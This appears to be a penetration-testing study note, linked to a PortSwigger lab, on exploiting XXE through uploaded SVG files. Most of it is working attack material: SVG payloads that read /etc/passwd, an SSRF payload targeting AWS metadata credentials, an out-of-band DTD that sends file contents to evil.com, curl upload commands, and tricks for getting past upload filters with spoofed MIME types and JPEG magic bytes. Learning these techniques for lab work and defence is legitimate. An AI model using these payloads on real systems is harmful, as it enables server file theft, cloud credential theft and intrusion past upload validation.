---
tags: [vapt, xxe, intermediate]
difficulty: intermediate
module: "14 - XXE"
topic: "14.04 XXE via SVG Upload"
portswigger_labs: ["Exploiting XXE via image file upload"]
---

# 14.04 — XXE via SVG Upload

## Why SVG Enables XXE

```
SVG = Scalable Vector Graphics
SVG IS XML!

When a server processes an uploaded SVG (resize, thumbnail, render),
the XML parser reads the SVG — including any DOCTYPE/entities!

If external entity processing is enabled → XXE!

COMMON SVG PROCESSING SCENARIOS:
  ✓ Profile picture upload → server creates thumbnail
  ✓ Logo upload → server validates/resizes
  ✓ Document attachment → server generates preview
  ✓ Image in rich text editor → server processes
  ✓ Template/design file upload → server renders
```

---

## Basic SVG XXE Payload

```xml
<!-- SAVE AS: xxe.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="40" font-size="12">&xxe;</text>
</svg>

<!-- UPLOAD THIS AS AN "IMAGE" (SVG format)
     When server renders the SVG:
     - Parses XML
     - Resolves &xxe; entity → reads /etc/passwd
     - Renders file contents as text in the SVG!
     
     If rendered SVG is shown in browser → SEE THE FILE CONTENTS!
-->
```

---

## SVG XXE with HTTP SSRF

```xml
<!-- SVG + SSRF: -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- SERVER FETCHES AWS METADATA → Cloud credentials in SVG response! -->
```

---

## SVG XXE for Blind Data Exfiltration

```xml
<!-- WHEN SVG IS NOT DISPLAYED TO USER (just stored): -->
<!-- USE OOB EXFILTRATION: -->

<!-- malicious.svg: -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>test</text>
</svg>

<!-- HOSTED xxe.dtd ON evil.com: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/steal?data=%file;'>">
%eval;
%exfil;

<!-- FLOW:
  1. Upload malicious.svg
  2. Server parses SVG XML
  3. Parser fetches xxe.dtd from evil.com
  4. xxe.dtd reads /etc/passwd, sends to evil.com via HTTP
  5. evil.com logs: GET /steal?data=root:x:0:0:...
  6. Attacker reads file contents from their server logs!
-->
```

---

## Creating the SVG Payload

```bash
# CREATE SVG FILE PROGRAMMATICALLY:
cat > xxe_file_read.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 400">
  <text x="10" y="20" font-family="monospace" font-size="8">
    &xxe;
  </text>
</svg>
EOF

# SSRF VERSION:
cat > xxe_ssrf.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF

# UPLOAD:
curl -X POST "https://target.com/upload/avatar" \
  -H "Cookie: session=YOURS" \
  -F "file=@xxe_file_read.svg;type=image/svg+xml"

# CHECK: View the uploaded image URL
# If SVG is displayed → file contents visible!
```

---

## Bypassing Upload Restrictions

```bash
# IF APP ONLY ACCEPTS JPEG/PNG:
# Try: Content-Type spoofing
curl -X POST "https://target.com/upload" \
  -F "file=@xxe.svg;type=image/jpeg"  # claim it's JPEG!

# Try: Double extension
# Rename to: xxe.svg.jpg or xxe.jpg.svg

# Try: MIME type check only (not actual content check)
# Some apps check MIME header, not file signature
# Add JPEG magic bytes at start:
printf '\xff\xd8\xff' > start.bin
cat start.bin xxe.svg > jpeg_with_xxe.jpg
# File starts with JPEG magic bytes but contains SVG XXE payload!

# UPLOAD VIA MULTIPART:
curl -X POST "https://target.com/profile/avatar" \
  -H "Cookie: session=YOURS" \
  -H "Accept: application/json" \
  -F "avatar=@jpeg_with_xxe.jpg;type=image/jpeg"
```

---

## Detecting SVG XXE Processing

```
INDICATORS THAT SVG IS PROCESSED SERVER-SIDE:
  ✓ Profile pictures are displayed as actual images (not just stored)
  ✓ App creates thumbnails of uploads
  ✓ App converts SVG to PNG/JPG
  ✓ App generates previews
  ✓ App shows "Upload failed: invalid XML" → XML parsed!
  ✓ App shows image dimensions in response → image analyzed!
  
TESTING FLOW:
  1. Upload a valid SVG → does it render? → XML likely processed
  2. Upload SVG with syntax error → "invalid XML" error? → XML parsed!
  3. Upload SVG with XXE → /etc/passwd contents in rendered SVG?
  4. Upload SVG with Collaborator URL → does Collaborator get pinged? → Blind XXE!
```

---

## Related Notes
- [[01 - What is XXE]] — fundamentals
- [[03 - Classic XXE File Read]] — basic XXE payloads
- [[05 - XXE via XLSX DOCX]] — other file formats
- [[06 - Blind XXE OOB]] — when image not displayed
- [[08 - XXE to SSRF]] — SSRF via SVG XXE
